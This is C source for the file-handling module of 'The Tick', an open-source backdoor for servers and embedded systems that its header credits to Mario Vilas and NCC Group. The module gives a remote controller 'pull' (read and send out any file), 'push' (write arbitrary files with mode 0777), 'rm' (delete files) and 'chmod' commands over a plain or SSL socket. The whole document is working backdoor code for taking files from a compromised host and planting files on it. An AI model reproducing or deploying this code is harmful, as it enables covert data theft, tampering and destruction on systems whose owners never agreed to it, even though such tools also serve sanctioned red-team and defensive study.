/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "file.h"

#include "tcp.h"
#include "stream.h"

// Helper function to get the free space available in a given mount point.
// Returns -1 on error.
ssize_t get_free_space(const char *pathname)
{
    ssize_t res = 0;
#ifdef _WIN32
    ULARGE_INTEGER free;
    free.QuadPart = 0;
    if (GetDiskFreeSpaceExA(pathname, &free, NULL, NULL) == 0) {
        return -1;
    }
    if (sizeof(ssize_t) >= (sizeof(free.QuadPart))) {
        res = free.QuadPart;
    } else if (free.u.HighPart == 0) {
        res = free.u.LowPart;
    } else {
        res = -1;   // it's ok to error out since we ignore the error
    }
    if (res < 0) {
        return -1;
    }
#else
    struct statvfs svfs;
    if (statvfs(pathname, &svfs) < 0) return -1;
    if (svfs.f_bsize > 0 && (SIZE_MAX / svfs.f_bsize) < svfs.f_bfree) {
        res = -1;   // it's ok to error out since we ignore the error
    } else {
        res = svfs.f_bfree * svfs.f_bsize;
    }
#endif
    return res;
}

// Implements the "pull" command.
void do_file_read(Parser *p)
{
    int file = -1;
    char *filename = (char *) &p->buffer;
    struct stat info;

    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Make sure we have read access to the file.
    if (access(filename, F_OK) == -1) {
        LOG("Cannot find %s\n", filename);
        parser_error(p, "file not found");
        return;
    }
    if (access(filename, R_OK) == -1) {
        LOG("Cannot read %s\n", filename);
        parser_error(p, "file not readable");
        return;
    }

    // Open the file.
    file = open(filename, O_RDONLY | O_BINARY | O_SEQUENTIAL);
    if (file < 0) {
        LOG("Cannot open %s\n", filename);
        parser_error(p, "cannot open file");
        return;
    }

    // Make sure the file isn't empty.
    info.st_size = 0;
    stat(filename, &info);
    if (info.st_size == 0) {
        LOG("Cannot stat or empty file %s\n", filename);
        parser_error(p, "cannot stat or empty file");
        close(file);
        return;
    }

    // Make sure the file isn't too big to send.
    if (info.st_size > (off_t) 0x7FFFFFFF) {
        LOG("File too large %s\n", filename);
        parser_error(p, "file too large");
        close(file);
        return;
    }

    // Send the file in the response.
    // Close the connection if something goes wrong at this point.
    LOG("Reading file %s\n", filename);
    parser_begin_response(p, CMD_STATUS_OK, info.st_size);
    int success = 0;
#if TICK_FEATURES_CRYPTO
    if (p->use_ssl) {
        success = copy_stream(file, STREAM_FD, (STREAM_T) &p->ssl, STREAM_SSL, info.st_size);
    } else {
        success = copy_stream(file, STREAM_FD, p->fd, STREAM_SOCKET, info.st_size);
    }
#else
    success = copy_stream(file, STREAM_FD, p->fd, STREAM_SOCKET, info.st_size);
#endif
    if (success < 0) {
        parser_close(p);
        LOG("Error sending file (%ld bytes)\n", info.st_size);
    } else {
        LOG("Success (%ld bytes)\n", info.st_size);
    }
    close(file);
}

// Implements the "push" command.
void do_file_write(Parser *p)
{
    int file = -1;
    int success = -1;
    ssize_t free_space = -1;
    char *filename = (char *) &p->buffer;
    char *pathname = NULL;

    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Make sure there's enough space in the target mount point.
    // If we fail to find out how much free space we have, ignore this check.
    pathname = dirname(filename);
    free_space = get_free_space(pathname);
    if (free_space == 0 || (free_space > 0 && free_space < (ssize_t) p->header.data_len)) {
        LOG("Not enough free space\n");
        parser_error(p, "not enough free space");
        return;
    }

    // Open the file for writing.
    file = open(filename, O_WRONLY | O_CREAT | O_TRUNC | O_SYNC | O_BINARY | O_SEQUENTIAL, 0777);
    if (file < 0) {
        LOG("Cannot open %s\n", filename);
        parser_error(p, "cannot open file");
        return;
    }

    // Fix the mode (in case umask is messing with us).
    chmod(filename, 0777);

    // Save the file data as it comes from the socket.
    LOG("Writing file %s\n", filename);
#if TICK_FEATURES_CRYPTO
    if (p->use_ssl) {
        success = copy_stream((STREAM_T) &p->ssl, STREAM_SSL, file, STREAM_FD, p->header.data_len);
    } else {
        success = copy_stream(p->fd, STREAM_SOCKET, file, STREAM_FD, p->header.data_len);
    }
#else
    success = copy_stream(p->fd, STREAM_SOCKET, file, STREAM_FD, p->header.data_len);
#endif

    // Flush the file cache to make sure the data is written to disk.
    // No need to check for errors on this operation.
#ifdef _WIN32
    FlushFileBuffers((HANDLE) _get_osfhandle(file));
#else
    fsync(file);
#endif

    // Close the file and return.
    close(file);
    if (success < 0) {
        LOG("Error receiving file (%d bytes)\n", p->header.data_len);
        parser_error(p, "failed to write file");
        parser_close(p);
    } else {
        LOG("Success (%d bytes)\n", p->header.data_len);
        parser_ok(p);
    }
    p->header.data_len = 0;     // Make sure to reset this counter!
}

// Implements the "rm" command.
void do_file_delete(Parser *p)
{
    char *filename = (char *) &p->buffer;

    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Delete the file.
    if (unlink(filename) < 0) {
        LOG("Error deleting file %s\n", filename);
        parser_error(p, "could not delete");
    } else {
        LOG("Deleted file %s\n", filename);
        parser_ok(p);
    }
}

// Implements the "chmod" command.
void do_file_chmod(Parser *p)
{
    char *filename = (char *) &p->buffer;
    uint16_t mode = 0;

    // First two bytes of the first argument are the mode flags in network byte order.
    if (p->header.cmd_len < sizeof(mode) + 2) {
        LOG("Malformed chmod command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
    }
    ssize_t success = 0;
#if TICK_FEATURES_CRYPTO
    if (p->use_ssl) {
        success = ssl_recv_block(&p->ssl, (char *) &mode, sizeof(mode));
    } else {
        success = recv_block(p->fd, (char *) &mode, sizeof(mode));
    }
#else
    success = recv_block(p->fd, (char *) &mode, sizeof(mode));
#endif
    if (success < 0) {
        LOG("Malformed chmod command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
    }
    p->header.cmd_len = p->header.cmd_len - sizeof(mode);
    mode = ntohs(mode);

    // The following bytes of the first argument are the filename.
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Chmod the file.
    if (chmod(filename, mode) < 0) {
        LOG("Error changing file mode to %03o %s\n", mode, filename);
        parser_error(p, "could not chmod");
    } else {
        LOG("Changed file mode to %03o %s\n", mode, filename);
        parser_ok(p);
    }
}
